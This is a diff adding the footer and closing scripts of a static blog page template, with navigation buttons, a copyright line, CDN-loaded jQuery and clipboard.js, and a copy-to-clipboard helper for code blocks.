+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2022
+    芝麻糊
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
